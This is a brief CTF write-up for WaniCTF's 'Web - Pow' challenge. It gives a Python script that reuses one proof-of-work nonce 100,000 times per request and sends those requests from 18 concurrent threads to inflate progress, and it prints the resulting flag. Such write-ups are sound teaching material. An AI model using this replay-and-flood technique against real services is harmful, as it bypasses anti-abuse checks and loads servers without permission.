# Web - Pow
Solved by **aan**
Original writeup by aan - https://ilikeronnnnii.github.io/2024/06/24/wanictf/

## Question
compute hash to get your flag

## Solution
```
payload_list = ["29671041"] * 100000 # increases progress by 100000 times per post request
payload = str(payload_list).replace("'", '"')

import time
import requests
import threading

url = "https://web-pow-lz56g6.wanictf.org/api/pow"
headers = {
    "Cookie": "pow_session={your cookie}", # insert your cookie
    "Content-Length": "14",
    "Content-Type": "application/json",
}

payload_list = ["29671041"] * 100000 # increases progress by 100000 times per post request
payload = str(payload_list).replace("'", '"')

def send_request():
    response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 429:  # Rate limit status code
        retry_after = int(response.headers.get("Retry-After", 1))
        print(f"Rate limited. Retrying after {retry_after} seconds.")
        time.sleep(retry_after)
    else:
        print(response.text)

def main():
    for _ in range(100):
        threads = []
        # Create 18 threads
        for _ in range(18):
            thread = threading.Thread(target=send_request)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        time.sleep(10)

if __name__ == "__main__":
    main()
```

### Flag
`FLAG{N0nCE_reusE_i$_FUn}`
